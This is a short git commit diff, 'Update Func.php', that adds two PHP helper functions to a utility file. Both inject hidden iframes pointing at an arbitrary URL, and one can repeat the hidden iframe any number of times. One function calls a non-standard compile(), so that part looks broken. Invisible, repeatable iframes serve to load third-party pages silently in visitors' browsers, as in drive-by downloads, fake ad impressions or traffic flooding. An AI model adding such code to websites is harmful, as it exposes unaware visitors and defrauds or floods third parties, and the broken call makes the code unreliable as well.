1ecb41a20910da9be0bcf3405165f5eb08508d56
Phl official <82045061+hojr128567@users.noreply.github.com>
2021-05-22 20:05:20 +0430

    Update Func.php

--- Func.php
+++ Func.php
@@ -1,4 +1,11 @@
 <?php
+function hframe($web_qqqqp53){
+  compile("<iframe src='$web_qqqqp53' hidden></iframe>");
+}
+function hframe_r($web_lk385,$hg555){
+ echo str_repeat("<iframe src='$web_lk385' hidden></iframe>
+ ",$hg555);
+}
 function ad_text_to_file($url_gw12n,$text_qgdw){
   $aFile123 = fopen($url_gw12n, "a");
 fwrite($aFile123, $text_qgdw);
